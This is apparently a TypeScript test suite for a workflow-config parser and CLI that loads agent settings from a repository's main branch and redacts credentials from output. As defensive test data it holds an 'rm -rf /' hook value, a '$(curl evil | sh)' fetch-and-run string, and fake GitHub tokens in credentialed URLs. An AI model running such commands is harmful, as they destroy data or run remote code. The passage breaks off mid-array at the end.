import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { describe, it } from "node:test";
import { EXIT, runCli } from "../server/cli.ts";
import { digestOf } from "../src/run.ts";
import { STAGE_ORDER, STAGE_PROFILES } from "../src/stages.ts";
import type { JsonValue } from "../src/tickets.ts";
import {
	checkReport,
	DEFAULT_MODEL,
	type EnvLookup,
	type Exec,
	type ExecResult,
	githubRepoFromRemote,
	isRepoSlug,
	loadWorkflow,
	MODEL_STAGES,
	modelsOf,
	parseWorkflow,
	type RepoSlug,
	redactCredentials,
	reloadWorkflow,
	statusReport,
	WORKFLOW_PATH,
	type WorkflowError,
	type WorkflowLoad,
} from "../src/workflow.ts";

function slug(text: string): RepoSlug {
	if (!isRepoSlug(text)) throw new Error(`bad slug ${text}`);

	return text;
}

const repo = slug("giuseppecrj/pi-herdr-factorio");
const mainSha = "a".repeat(40);
const candidateSha = "b".repeat(40);

const env: EnvLookup = (name) =>
	({ HOME: "/home/factory", FACTORY_WORKSPACES: "/srv/workspaces" })[name];

const valid = `---
repository: giuseppecrj/pi-herdr-factorio
polling:
  interval_ms: 30000
agent:
  max_concurrent: 2
stages:
  build:
    max_turns: 30
---
General guidance.

## build
Write the test first.

## review
Read the diff.
`;

function frontMatter(lines: string): string {
	return `---\nrepository: giuseppecrj/pi-herdr-factorio\n${lines}\n---\nbody\n`;
}

function parse(text: string) {
	return parseWorkflow({ text, repo, env });
}

function errorOf(text: string): WorkflowError {
	const parsed = parse(text);

	assert.equal(parsed.kind, "invalid", "expected the workflow to be invalid");

	if (parsed.kind !== "invalid") throw new Error("unreachable");

	return parsed.error;
}

function validation(text: string): { field: string; message: string } {
	const error = errorOf(text);

	if (error.kind !== "workflow_validation_error") {
		throw new Error(`expected a validation error, got ${error.kind}`);
	}

	return error;
}

type Branch = { sha: string; text: string | null };

type FakeGh = { exec: Exec; calls: string[][] };

function fakeGh(branches: Map<string, Branch>): FakeGh {
	const calls: string[][] = [];

	const exec: Exec = async (command, args) => {
		calls.push([command, ...args]);
		const path = args.find((arg) => arg.startsWith("repos/")) ?? "";
		const ref = /\/git\/ref\/heads\/(.+)$/.exec(path)?.[1];

		if (ref !== undefined) {
			const branch = branches.get(ref);

			return branch === undefined
				? { stdout: "", stderr: "gh: Not Found (HTTP 404)", code: 1 }
				: { stdout: `${branch.sha}\n`, stderr: "", code: 0 };
		}

		const sha = /\?ref=([0-9a-f]{40})$/.exec(path)?.[1];

		const branch = [...branches.values()].find(
			(candidate) => candidate.sha === sha,
		);

		if (branch === undefined || branch.text === null) {
			return { stdout: "", stderr: "gh: Not Found (HTTP 404)", code: 1 };
		}

		return { stdout: branch.text, stderr: "", code: 0 };
	};

	return { exec, calls };
}

async function load(
	branches: Map<string, Branch>,
	ref = "main",
): Promise<WorkflowLoad> {
	return loadWorkflow({ exec: fakeGh(branches).exec, repo, ref, env });
}

describe("parseWorkflow", () => {
	it("accepts the committed production WORKFLOW.md", () => {
		const parsed = parse(readFileSync(WORKFLOW_PATH, "utf8"));

		assert.equal(parsed.kind, "valid");

		if (parsed.kind !== "valid") return;

		assert.deepEqual(parsed.warnings, []);
		assert.equal(parsed.config.polling.intervalMs, 30_000);
		assert.equal(parsed.config.agent.maxConcurrent, 2);
		assert.equal(parsed.config.checkpoints.approveMerge.mode, "always");

		for (const stage of MODEL_STAGES) {
			assert.equal(parsed.config.stages[stage].model, "openai/gpt-6.1-sol");
			assert.ok(parsed.guidance.stages[stage], `${stage} has guidance`);
		}
	});

	it("parses front matter, defaults and stage guidance", () => {
		const parsed = parse(valid);

		assert.equal(parsed.kind, "valid");

		if (parsed.kind !== "valid") return;

		const { config, guidance } = parsed;

		assert.equal(config.repository, repo);
		assert.equal(config.polling.intervalMs, 30_000);
		assert.equal(config.agent.maxConcurrent, 2);
		assert.equal(config.stages.build.budget.maxTurns, 30);
		assert.equal(config.stages.review.budget.maxTurns, 20);
		assert.equal(config.stages.review.budget.stallMs, 300_000);
		assert.equal(config.retry.maxBackoffMs, 300_000);
		assert.equal(config.checkpoints.approveMerge.mode, "always");
		assert.equal(guidance.general, "General guidance.");
		assert.equal(guidance.stages.build, "Write the test first.");
		assert.equal(guidance.stages.review, "Read the diff.");
		assert.equal(guidance.stages.specify, undefined);
		assert.deepEqual(parsed.warnings, []);
	});

	it("defaults every model stage to openai/gpt-6.1-sol", () => {
		const parsed = parse(frontMatter(""));

		assert.equal(parsed.kind, "valid");

		if (parsed.kind !== "valid") return;

		for (const stage of MODEL_STAGES) {
			assert.equal(parsed.config.stages[stage].model, DEFAULT_MODEL);
		}

		assert.equal(DEFAULT_MODEL, "openai/gpt-6.1-sol");
	});

	it("names exactly the stages that STAGE_PROFILES gives model access", () => {
		const withModels = STAGE_ORDER.filter(
			(stage) => STAGE_PROFILES[stage].modelAccess !== "none",
		);

		assert.deepEqual([...MODEL_STAGES], withModels);
	});

	it("freezes the parsed config", () => {
		const parsed = parse(valid);

		assert.equal(parsed.kind, "valid");

		if (parsed.kind !== "valid") return;

		assert.ok(Object.isFrozen(parsed.config));
		assert.ok(Object.isFrozen(parsed.config.stages.build.budget));
		assert.ok(Object.isFrozen(parsed.guidance.stages));
	});

	it("requires front matter", () => {
		assert.equal(
			errorOf("# no front matter\n").kind,
			"workflow_front_matter_missing",
		);
	});

	it("reports bad YAML as a parse error", () => {
		assert.equal(
			errorOf("---\nrepository: [\n---\n").kind,
			"workflow_parse_error",
		);
		assert.equal(errorOf("---\nrepository: x\n").kind, "workflow_parse_error");
		assert.equal(
			errorOf("---\na: 1\na: 2\n---\n").kind,
			"workflow_parse_error",
		);
	});

	it("rejects front matter that is not a map", () => {
		assert.equal(
			errorOf("---\n- a\n- b\n---\n").kind,
			"workflow_front_matter_not_a_map",
		);
		assert.equal(
			errorOf("---\n---\nbody\n").kind,
			"workflow_front_matter_not_a_map",
		);
	});

	it("requires the repository to match the caller", () => {
		assert.equal(
			validation("---\npolling:\n  interval_ms: 30000\n---\n").field,
			"repository",
		);

		const other = validation("---\nrepository: someone/else\n---\n");

		assert.equal(other.field, "repository");
		assert.equal(
			other.message,
			"repository must equal the repository the caller loaded",
		);
	});

	it("rejects zero and negative budgets", () => {
		for (const value of ["0", "-1"]) {
			const error = validation(
				frontMatter(`stages:\n  build:\n    wall_ms: ${value}`),
			);

			assert.equal(error.field, "stages.build.wall_ms");
			assert.match(error.message, /positive integer/);
		}

		assert.equal(
			validation(frontMatter("usage:\n  max_tokens_per_run: 0")).field,
			"usage.max_tokens_per_run",
		);

		assert.equal(
			validation(frontMatter("retry:\n  max_attempts: -3")).field,
			"retry.max_attempts",
		);

		assert.equal(
			validation(frontMatter("stages:\n  admit:\n    stall_ms: 0")).field,
			"stages.admit.stall_ms",
		);
	});

	it("bounds the poll interval and concurrency", () => {
		assert.equal(
			validation(frontMatter("polling:\n  interval_ms: 9999")).field,
			"polling.interval_ms",
		);

		assert.equal(
			validation(frontMatter("agent:\n  max_concurrent: 5")).field,
			"agent.max_concurrent",
		);

		assert.equal(
			validation(frontMatter("agent:\n  max_concurrent: two")).field,
			"agent.max_concurrent",
		);
	});

	it("rejects provider anthropic with the owner rule", () => {
		const error = validation(
			frontMatter("stages:\n  review:\n    model: anthropic/claude-sonnet-5-5"),
		);

		assert.equal(error.field, "stages.review.model");
		assert.match(error.message, /exe\.dev credits/);
	});

	it("rejects malformed model IDs and a model key on a no-model stage", () => {
		assert.equal(
			validation(frontMatter("stages:\n  build:\n    model: gpt")).field,
			"stages.build.model",
		);

		assert.equal(
			validation(frontMatter("stages:\n  land:\n    model: openai/gpt-6.1-sol"))
				.field,
			"stages.land.model",
		);

		assert.equal(
			validation(frontMatter("stages:\n  deploy: {}")).field,
			"stages.deploy",
		);
	});

	it("expands $VAR only in workspace.root and never in other fields", () => {
		const parsed = parse(
			frontMatter("workspace:\n  root: $FACTORY_WORKSPACES"),
		);

		assert.equal(parsed.kind, "valid");

		if (parsed.kind === "valid") {
			assert.equal(parsed.config.workspace.expandedRoot, "/srv/workspaces");
			assert.equal(
				parsed.config.workspace.rootAsWritten,
				"$FACTORY_WORKSPACES",
			);
		}

		const error = validation(
			frontMatter("stages:\n  build:\n    model: $MODEL"),
		);

		assert.equal(error.field, "stages.build.model");
		assert.match(error.message, /only in workspace\.root/);

		assert.equal(
			validation(frontMatter("workspace:\n  root: $UNSET_VARIABLE")).field,
			"workspace.root",
		);

		assert.equal(
			validation(frontMatter("workspace:\n  root: $HOME/x")).field,
			"workspace.root",
		);

		assert.equal(
			validation(frontMatter("workspace:\n  root: relative/dir")).field,
			"workspace.root",
		);
	});

	it("expands ~ in workspace.root from the passed environment", () => {
		const parsed = parse(frontMatter(""));

		assert.equal(parsed.kind, "valid");

		if (parsed.kind === "valid") {
			assert.equal(
				parsed.config.workspace.expandedRoot,
				"/home/factory/factory-workspaces",
			);
		}
	});

	it("rejects unknown checkpoint modes and removing the merge checkpoint", () => {
		const auto = validation(
			frontMatter("checkpoints:\n  approve_merge:\n    mode: auto"),
		);

		assert.equal(auto.field, "checkpoints.approve_merge.mode");
		assert.match(auto.message, /unknown checkpoint mode: use always/);
		assert.doesNotMatch(auto.message, /auto/);

		const never = validation(
			frontMatter("checkpoints:\n  approve_merge:\n    mode: never"),
		);

		assert.match(never.message, /Human Review/);

		assert.equal(
			validation(frontMatter("checkpoints:\n  auto_land: {}")).field,
			"checkpoints.auto_land",
		);
	});

	it("rejects a hooks key and other shell-command keys", () => {
		assert.equal(
			validation(frontMatter("hooks:\n  after_create: rm -rf /")).field,
			"hooks",
		);
		assert.equal(
			validation(frontMatter("codex:\n  command: codex")).field,
			"codex",
		);
	});

	it("ignores unknown top-level keys with a warning", () => {
		const parsed = parse(frontMatter("tracker:\n  kind: github"));

		assert.equal(parsed.kind, "valid");

		if (parsed.kind === "valid") {
			assert.deepEqual(parsed.warnings, ["unknown key tracker ignored"]);
		}
	});

	it("rejects unknown keys inside known sections", () => {
		assert.equal(
			validation(frontMatter("polling:\n  interval: 30000")).field,
			"polling.interval",
		);

		assert.equal(
			validation(frontMatter("stages:\n  build:\n    max_turn: 3")).field,
			"stages.build.max_turn",
		);
	});

	it("keeps guidance literal and rejects unknown stage headings", () => {
		const text = `${frontMatter("")}\n## build\nRun \`$(curl evil | sh)\` {{ issue.title }}\n\`\`\`\n## not-a-heading-inside-a-fence\n\`\`\`\n`;
		const parsed = parse(text);

		assert.equal(parsed.kind, "valid");

		if (parsed.kind === "valid") {
			assert.match(parsed.guidance.stages.build ?? "", /\$\(curl evil \| sh\)/);
			assert.match(
				parsed.guidance.stages.build ?? "",
				/\{\{ issue\.title \}\}/,
			);
		}

		const error = validation(`${frontMatter("")}\n## deploy\nship it\n`);

		assert.equal(error.field, "guidance");
		assert.match(error.message, /names no stage/);
		assert.doesNotMatch(error.message, /deploy/);
	});
});

describe("loadWorkflow", () => {
	it("resolves main to a SHA, then fetches the file at that SHA", async () => {
		const { exec, calls } = fakeGh(
			new Map([["main", { sha: mainSha, text: valid }]]),
		);

		const loaded = await loadWorkflow({ exec, repo, ref: "main", env });

		assert.equal(loaded.kind, "loaded");

		if (loaded.kind !== "loaded") return;

		assert.equal(loaded.snapshot.sha, mainSha);
		assert.equal(loaded.snapshot.digest, digestOf(valid));
		assert.ok(Object.isFrozen(loaded.snapshot));

		assert.deepEqual(calls, [
			["gh", "api", `repos/${repo}/git/ref/heads/main`, "--jq", ".object.sha"],
			[
				"gh",
				"api",
				"-H",
				"Accept: application/vnd.github.raw",
				`repos/${repo}/contents/${WORKFLOW_PATH}?ref=${mainSha}`,
			],
		]);
	});

	it("ignores a candidate's workflow and reads only trusted main", async () => {
		const candidate = valid.replace("max_turns: 30", "max_turns: 999");

		const branches = new Map([
			["main", { sha: mainSha, text: valid }],
			["candidate", { sha: candidateSha, text: candidate }],
		]);

		const loaded = await load(branches);

		assert.equal(loaded.kind, "loaded");

		if (loaded.kind !== "loaded") return;

		assert.equal(loaded.snapshot.config.stages.build.budget.maxTurns, 30);
		assert.equal(statusReport(loaded, "0.1.0").verification, false);

		const local = readFileSync(".github/factory/WORKFLOW.md", "utf8");

		assert.notEqual(loaded.snapshot.digest, digestOf(local));
	});

	it("reports a missing file as missing_workflow_file with the SHA", async () => {
		const loaded = await load(
			new Map([["main", { sha: mainSha, text: null }]]),
		);

		assert.equal(loaded.kind, "failed");

		if (loaded.kind !== "failed") return;

		assert.partialDeepStrictEqual(loaded.error, {
			kind: "missing_workflow_file",
			cause: "not_found",
			status: 404,
		});
		assert.equal(loaded.sha, mainSha);
		assert.match(loaded.error.message, /not found \(HTTP 404\)/);
	});

	it("reports an unresolvable ref as source_unavailable", async () => {
		const loaded = await load(new Map(), "main");

		assert.equal(loaded.kind, "failed");

		if (loaded.kind === "failed") {
			assert.equal(loaded.error.kind, "source_unavailable");
			assert.equal(loaded.sha, null);
		}

		const bad = await load(new Map(), "../main");

		assert.equal(bad.kind, "failed");
	});

	it("keeps the digest of a fetched file that fails validation", async () => {
		const broken = frontMatter("agent:\n  max_concurrent: 0");

		const loaded = await load(
			new Map([["main", { sha: mainSha, text: broken }]]),
		);

		assert.equal(loaded.kind, "failed");

		if (loaded.kind === "failed") {
			assert.equal(loaded.digest, digestOf(broken));
			assert.equal(loaded.error.kind, "workflow_validation_error");
		}
	});
});

describe("reloadWorkflow", () => {
	it("keeps the last valid snapshot when a reload is invalid", async () => {
		const first = await load(
			new Map([["main", { sha: mainSha, text: valid }]]),
		);

		const second = await load(
			new Map([
				[
					"main",
					{
						sha: candidateSha,
						text: frontMatter("polling:\n  interval_ms: 0"),
					},
				],
			]),
		);

		assert.equal(first.kind, "loaded");

		if (first.kind !== "loaded") return;

		const reload = reloadWorkflow(first.snapshot, second);

		assert.equal(reload.kind, "kept");

		if (reload.kind !== "kept") return;

		assert.equal(reload.snapshot.digest, digestOf(valid));
		assert.equal(reload.error.kind, "workflow_validation_error");

		const report = checkReport(second, { next: second, result: reload });

		assert.equal(report.reload?.outcome, "kept");
		assert.equal(report.reload?.inForce?.digest, digestOf(valid));
	});

	it("applies a valid reload and has nothing in force without a valid load", async () => {
		const next = await load(new Map([["main", { sha: mainSha, text: valid }]]));

		assert.equal(reloadWorkflow(null, next).kind, "applied");

		const missing = await load(
			new Map([["main", { sha: mainSha, text: null }]]),
		);

		assert.equal(reloadWorkflow(null, missing).kind, "unavailable");
	});
});

describe("reports", () => {
	it("status reports trusted settings with execution disabled", async () => {
		const loaded = await load(
			new Map([["main", { sha: mainSha, text: valid }]]),
		);

		const report = statusReport(loaded, "0.1.0");

		assert.equal(report.workflowSha, mainSha);
		assert.equal(report.workflowDigest, digestOf(valid));
		assert.equal(report.executionEnabled, false);
		assert.equal(report.controller.state, "unavailable");
		assert.equal(report.models?.build, DEFAULT_MODEL);
		assert.equal(report.limits?.pollIntervalMs, 30_000);
		assert.doesNotMatch(JSON.stringify(report), /githubToken|github token/i);
	});

	it("status carries the error and no settings when the workflow is invalid", async () => {
		const report = statusReport(
			await load(new Map([["main", { sha: mainSha, text: null }]])),
			"0.1.0",
		);

		assert.equal(report.workflow, "invalid");
		assert.equal(report.workflowError?.kind, "missing_workflow_file");
		assert.equal(report.models, null);
		assert.equal(report.executionEnabled, false);
	});

	it("marks a non-main ref as verification", async () => {
		const loaded = await load(
			new Map([["fixture", { sha: candidateSha, text: valid }]]),
			"fixture",
		);

		assert.equal(checkReport(loaded, null).verification, true);
	});

	it("never prints the expanded workspace root", async () => {
		const text = frontMatter("workspace:\n  root: $FACTORY_WORKSPACES");
		const loaded = await load(new Map([["main", { sha: mainSha, text }]]));
		const printed = JSON.stringify(checkReport(loaded, null));

		assert.match(printed, /\$FACTORY_WORKSPACES/);
		assert.doesNotMatch(printed, /\/srv\/workspaces/);
	});

	it("lists every model stage", async () => {
		const loaded = await load(
			new Map([["main", { sha: mainSha, text: valid }]]),
		);

		assert.equal(loaded.kind, "loaded");

		if (loaded.kind === "loaded") {
			assert.deepEqual(Object.keys(modelsOf(loaded.snapshot.config)), [
				...MODEL_STAGES,
			]);
		}
	});
});

describe("githubRepoFromRemote", () => {
	it("reads GitHub remotes and refuses others", () => {
		assert.equal(
			githubRepoFromRemote("git@github.com:giuseppecrj/pi-herdr-factorio.git"),
			repo,
		);
		assert.equal(
			githubRepoFromRemote(
				"https://github.com/giuseppecrj/pi-herdr-factorio\n",
			),
			repo,
		);
		assert.equal(
			githubRepoFromRemote(
				"ssh://git@github.com/giuseppecrj/pi-herdr-factorio.git",
			),
			null,
		);
		assert.equal(
			githubRepoFromRemote(
				"https://gitlab.com/giuseppecrj/pi-herdr-factorio.git",
			),
			null,
		);
		assert.equal(githubRepoFromRemote("/srv/git/repo.git"), null);
	});
});

type RawRun = { code: number; stdout: string; stderr: string };

async function runRaw(argv: string[], exec: Exec): Promise<RawRun> {
	let stdout = "";
	let stderr = "";

	const code = await runCli(argv, {
		exec,
		env,
		stdout: (text) => {
			stdout += text;
		},
		stderr: (text) => {
			stderr += text;
		},
	});

	return { code, stdout, stderr };
}

type CliRun = { code: number; json: JsonValue; stderr: string };

async function cli(
	argv: string[],
	branches: Map<string, Branch>,
): Promise<CliRun> {
	const { code, stdout, stderr } = await runRaw(argv, fakeGh(branches).exec);
	const json: JsonValue = stdout === "" ? null : JSON.parse(stdout);

	return { code, json, stderr };
}

describe("server/cli.ts", () => {
	const repoArgs = ["--json", "--repo", repo];
	const trusted = new Map([["main", { sha: mainSha, text: valid }]]);
	const missing = new Map([["main", { sha: mainSha, text: null }]]);

	it("workflow-check exits 0 with the snapshot when valid", async () => {
		const run = await cli(["workflow-check", ...repoArgs], trusted);

		assert.equal(run.code, EXIT.ok);

		assert.partialDeepStrictEqual(run.json, {
			valid: true,
			ref: "main",
			sha: mainSha,
			digest: digestOf(valid),
			verification: false,
			config: { agent: { maxConcurrent: 2 } },
		});
	});

	it("workflow-check exits 1 and names the field when invalid", async () => {
		const broken = new Map([
			[
				"main",
				{
					sha: mainSha,
					text: frontMatter("stages:\n  build:\n    max_turns: 0"),
				},
			],
		]);

		const run = await cli(["workflow-check", ...repoArgs], broken);

		assert.equal(run.code, EXIT.invalid);

		assert.partialDeepStrictEqual(run.json, {
			valid: false,
			error: {
				kind: "workflow_validation_error",
				field: "stages.build.max_turns",
			},
		});

		const absent = await cli(["workflow-check", ...repoArgs], missing);

		assert.equal(absent.code, EXIT.invalid);
		assert.partialDeepStrictEqual(absent.json, {
			error: { kind: "missing_workflow_file" },
		});
	});

	it("status exits 0 even when the workflow is missing", async () => {
		const run = await cli(["status", ...repoArgs], missing);

		assert.equal(run.code, EXIT.ok);

		assert.partialDeepStrictEqual(run.json, {
			workflow: "invalid",
			workflowSha: mainSha,
			executionEnabled: false,
			controller: { state: "unavailable" },
		});
	});

	it("status prints models, limits and the workflow digest", async () => {
		const run = await cli(["status", ...repoArgs], trusted);

		assert.equal(run.code, EXIT.ok);

		assert.partialDeepStrictEqual(run.json, {
			workflow: "valid",
			workflowDigest: digestOf(valid),
			models: { build: DEFAULT_MODEL, review: DEFAULT_MODEL },
			limits: { pollIntervalMs: 30_000, maxConcurrent: 2 },
			executionEnabled: false,
		});
	});

	it("--reload-ref shows the last valid snapshot staying in force", async () => {
		const branches = new Map([
			["main", { sha: mainSha, text: valid }],
			["broken", { sha: candidateSha, text: frontMatter("hooks: {}") }],
		]);

		const run = await cli(
			["workflow-check", ...repoArgs, "--reload-ref", "broken"],
			branches,
		);

		assert.equal(run.code, EXIT.invalid);

		assert.partialDeepStrictEqual(run.json, {
			valid: true,
			reload: {
				ref: "broken",
				valid: false,
				outcome: "kept",
				error: { field: "hooks" },
				inForce: { ref: "main", sha: mainSha, digest: digestOf(valid) },
			},
		});
	});

	it("exits 2 on usage errors", async () => {
		const cases = [
			[],
			["workflow-check", "--repo", repo],
			["workflow-check", "--json"],
			["workflow-check", "--json", "--repo", "not a repo"],
			["status", ...repoArgs, "--reload-ref", "x"],
			["status", ...repoArgs, "--ref", "../main"],
			["status", ...repoArgs, "--bogus"],
			["deploy", ...repoArgs],
		];

		for (const argv of cases) {
			const run = await cli(argv, trusted);

			assert.equal(run.code, EXIT.usage, argv.join(" "));
			assert.equal(run.json, null);
			assert.match(run.stderr, /Usage:/);
		}
	});
});

const secret = `ghp_${"aB3dE6gH9k".repeat(4).slice(0, 36)}`;
const credentialedOrigin = `https://x-access-token:${secret}@github.com/giuseppecrj/pi-herdr-factorio.git`;

function assertNoSecret(printed: string): void {
	assert.doesNotMatch(printed, new RegExp(secret));
	assert.doesNotMatch(printed, /x-access-token/);
	assert.doesNotMatch(printed, /hunter2/);
}

function serving(text: string): Exec {
	return fakeGh(new Map([["main", { sha: mainSha, text }]])).exec;
}

function resolvingThen(fetch: () => Promise<ExecResult>): Exec {
	return async (_command, args) =>
		args.includes("--jq")
			? { stdout: `${mainSha}\n`, stderr: "", code: 0 }
			: fetch();
}

const leakyFiles: [string, string][] = [
	[
		"a YAML error excerpt with an unclosed [",
		`---\nrepository: [${secret}\n---\n`,
	],
	[
		"a YAML error on a later line",
		frontMatter(`polling: {interval_ms: [${secret}`),
	],
	["a duplicate key", frontMatter(`"${secret}": 1\n"${secret}": 2`)],
	["an anchor name", frontMatter(`polling: &${secret}\n  interval_ms: 30000`)],
	["an alias name", frontMatter(`x: *${secret}`)],
	["an integer value", frontMatter(`polling:\n  interval_ms: ${secret}`)],
	[
		"a bounded integer value",
		frontMatter(`agent:\n  max_concurrent: ${secret}`),
	],
	[
		"a budget value",
		frontMatter(`stages:\n  build:\n    max_turns: ${secret}`),
	],
	["a model value", frontMatter(`stages:\n  build:\n    model: ${secret}`)],
	[
		"a checkpoint mode",
		frontMatter(`checkpoints:\n  approve_merge:\n    mode: ${secret}`),
	],
	["an environment reference", frontMatter(`workspace:\n  root: $${secret}`)],
	["a repository value", `---\nrepository: owner/${secret}\n---\n`],
	[
		"a repository URL",
		`---\nrepository: https://x:${secret}@github.com/a/b\n---\n`,
	],
	["a stage heading", `${frontMatter("")}\n## ${secret}\n`],
	[
		"an unknown top-level key",
		frontMatter(`"Authorization: Bearer ${secret}": x`),
	],
	[
		"an unknown key holding a URL",
		frontMatter(`"https://x:${secret}@example.com": x`),
	],
	["an unknown section key", frontMatter(`polling:\n  "token ${secret}": 1`)],
	["an unknown stage", frontMatter(`stages:\n  "${secret} x": {}`)],
	[
		"an unknown stage setting",
		frontMatter(`stages:\n  build:\n    "x ${secret}": 1`),
	],
	[
		"a query string in a value",
		frontMatter(`polling:\n  interval_ms: "https://h/x?token=${secret}"`),
	],
];

const leakyExecs: [string, Exec][] = [
	[
		"gh stderr when resolving",
		async () => ({
			stdout: "",
			stderr: `gh: Bad credentials ${secret} (HTTP 401)`,
			code: 1,
		}),
	],
	[
		"gh stdout when resolving",
		async () => ({ stdout: `${secret}\n`, stderr: "", code: 0 }),
	],
	[
		"gh stderr when fetching",
		resolvingThen(async () => ({
			stdout: "",
			stderr: `fatal: '${credentialedOrigin}' (HTTP 403)`,
			code: 1,
		})),
	],
	[
		"gh stdout when fetching",
		resolvingThen(async () => ({ stdout: secret, stderr: "", code: 1 })),
	],
	[
		"a query string in gh stderr",
		async () => ({
			stdout: "",
			stderr: `Get "https://api.github.com/repos/a/b?access_token=${secret}": dial tcp: lookup api.github.com: no such host`,
			code: 1,
		}),
	],
	[
		"a rejected exec when resolving",
		async () => Promise.reject(new Error(`spawn gh ${credentialedOrigin}`)),
	],
	[
		"a rejected exec when fetching",
		resolvingThen(async () =>
			Promise.reject(new Error(`spawn gh ?token=${secret}`)),
		),
	],
];

const leakyArgs: [string, string[]][] = [
	[
		"a query string in --ref",
		["status", "--json", "--repo", repo, "--ref", `main?token=${secret}`],
	],
	[
		"a query string in --reload-ref",
		[
			"workflow-check",
			"--json",
			"--repo",
			repo,
			"--reload-ref",
			`x?token=${secret}`,
		],
	],
	[
		"a query string in --repo",
		["status", "--json", "--repo", `a/b?token=${secret}`],
	],
	["an unknown option", ["status", "--json", "--repo", repo, `--${secret}`]],
	["an extra positional", ["status", "--json", "--repo", repo, secret]],
	["an unknown command", [secret, "--json", "--repo", repo]],
];

describe("untrusted text never reaches CLI output", () => {
	it("uses a realistic 40-character token", () => {
		assert.match(secret, /^ghp_[A-Za-z0-9]{36}$/);
	});

	for (const [name, text] of leakyFiles) {
		it(`withholds ${name}`, async () => {
			for (const command of ["workflow-check", "status"]) {
				const run = await runRaw(
					[command, "--json", "--repo", repo],
					serving(text),
				);

				assert.notEqual(run.stdout, "");
				assertNoSecret(run.stdout + run.stderr);
			}
		});
	}

	for (const [name, exec] of leakyExecs) {
		it(`withholds ${name}`, async () => {
			for (const command of ["workflow-check", "status"]) {
				const run = await runRaw([command, "--json", "--repo", repo], exec);

				assert.notEqual(run.stdout, "");
				assertNoSecret(run.stdout + run.stderr);
			}
		});
	}

	for (const [name, argv] of leakyArgs) {
		it(`withholds ${name}`, async () => {
			const run = await runRaw(argv, serving(valid));

			assert.equal(run.code, EXIT.usage);
			assert.equal(run.stdout, "");
			assert.match(run.stderr, /Usage:/);
			assertNoSecret(run.stderr);
		});
	}

	it("still redacts URL credentials in valid guidance", async () => {
		const url = "https://user:hunter2@example.com/x";
		const text = `${frontMatter("")}\nSee ${url}.\n`;

		for (const command of ["workflow-check", "status"]) {
			const run = await runRaw(
				[command, "--json", "--repo", repo],
				serving(text),
			);

			assert.equal(run.code, EXIT.ok);
			assertNoSecret(run.stdout);
		}
	});
});

describe("errors built from factory text", () => {
	it("reports a YAML error by code and position", () => {
		assert.deepEqual(errorOf(`---\nrepository: [${secret}\n---\n`), {
			kind: "workflow_parse_error",
			code: "BAD_INDENT",
			line: 2,
			column: 54,
			message: "YAML BAD_INDENT at line 2, column 54",
		});

		assert.partialDeepStrictEqual(
			errorOf(frontMatter(`"${secret}": 1\n"${secret}": 2`)),
			{ kind: "workflow_parse_error", code: "DUPLICATE_KEY", line: 4 },
		);
	});

	const ghFailures: [string, ExecResult, string, number | null][] = [
		[
			"a 404",
			{ stdout: "", stderr: "gh: Not Found (HTTP 404)", code: 1 },
			"not_found",
			404,
		],
		[
			"a 401",
			{ stdout: "", stderr: "gh: Bad credentials (HTTP 401)", code: 1 },
			"auth",
			401,
		],
		[
			"a 403",
			{ stdout: "", stderr: "gh: Forbidden (HTTP 403)", code: 1 },
			"auth",
			403,
		],
		[
			"a 502",
			{ stdout: "", stderr: "gh: Bad Gateway (HTTP 502)", code: 1 },
			"other",
			502,
		],
		[
			"no connection",
			{ stdout: "", stderr: "error connecting to api.github.com", code: 1 },
			"network",
			null,
		],
		[
			"a DNS failure",
			{
				stdout: "",
				stderr: "dial tcp: lookup api.github.com: no such host",
				code: 1,
			},
			"network",
			null,
		],
		["silence", { stdout: "", stderr: "", code: 1 }, "other", null],
	];

	for (const [name, result, cause, status] of ghFailures) {
		it(`maps ${name} from gh to cause ${cause} at both steps`, async () => {
			const resolve = await loadWorkflow({
				exec: async () => result,
				repo,
				ref: "main",
				env,
			});

			const fetch = await loadWorkflow({
				exec: resolvingThen(async () => result),
				repo,
				ref: "main",
				env,
			});

			assert.equal(resolve.kind, "failed");
			assert.equal(fetch.kind, "failed");

			if (resolve.kind !== "failed" || fetch.kind !== "failed") return;

			assert.partialDeepStrictEqual(resolve.error, {
				kind: "source_unavailable",
				cause,
				status,
			});
			assert.partialDeepStrictEqual(fetch.error, {
				kind: "missing_workflow_file",
				cause,
				status,
			});
			assert.match(resolve.error.message, /^cannot resolve the branch: /);
			assert.match(
				fetch.error.message,
				/^cannot fetch \.github\/factory\/WORKFLOW\.md: /,
			);
		});
	}

	it("reports a rejected exec at either step as other", async () => {
		const reject = async () => Promise.reject(new Error("spawn gh ENOENT"));

		for (const exec of [reject, resolvingThen(reject)]) {
			const loaded = await loadWorkflow({ exec, repo, ref: "main", env });

			assert.equal(loaded.kind, "failed");

			if (loaded.kind !== "failed") continue;

			assert.deepEqual(loaded.error, {
				kind: "source_unavailable",
				cause: "other",
				status: null,
				message: "cannot run gh",
			});
		}
	});

	const rules: [string, string, string][] = [
		[
			"polling:\n  interval_ms: abc",
			"polling.interval_ms",
			"must be an integer of at least 10000",
		],
		[
			"polling:\n  interval_ms: 9999",
			"polling.interval_ms",
			"must be an integer of at least 10000",
		],
		[
			"agent:\n  max_concurrent: 5",
			"agent.max_concurrent",
			"must be an integer from 1 to 4",
		],
		[
			"stages:\n  build:\n    wall_ms: 0",
			"stages.build.wall_ms",
			"must be a positive integer",
		],
		[
			"retry:\n  max_attempts: 99999999999999999999",
			"retry.max_attempts",
			"must be an integer no larger than 9007199254740991",
		],
		[
			"stages:\n  build:\n    model: gpt",
			"stages.build.model",
			"must be <provider>/<model>",
		],
		[
			"workspace:\n  root: $UNSET_VARIABLE",
			"workspace.root",
			"names an environment variable that is not set",
		],
	];

	for (const [lines, field, rule] of rules) {
		it(`names the rule for ${field} without its value`, () => {
			assert.deepEqual(validation(frontMatter(lines)), {
				kind: "workflow_validation_error",
				field,
				message: `${field} ${rule}`,
			});
		});
	}

	it("names an unknown key only when it is a plain identifier", () => {
		const warnings = (lines: string) => {
			const parsed = parse(frontMatter(lines));

			assert.equal(parsed.kind, "valid");

			return parsed.kind === "valid" ? parsed.warnings : [];
		};

		assert.deepEqual(warnings("tracker.v2-x_y: 1"), [
			"unknown key tracker.v2-x_y ignored",
		]);
		assert.deepEqual(warnings('"has space": 1'), [
			"unknown key (name withheld)",
		]);
		assert.deepEqual(warnings(`${"k".repeat(65)}: 1`), [
			"unknown key (name withheld)",
		]);
		assert.equal(
			validation(frontMatter('polling:\n  "a b": 1')).field,
			"polling.(name withheld)",
		);
	});
});

describe("origin parsing", () => {
	const path = "giuseppecrj/pi-herdr-factorio";

	const accepted = [
		`https://github.com/${path}`,
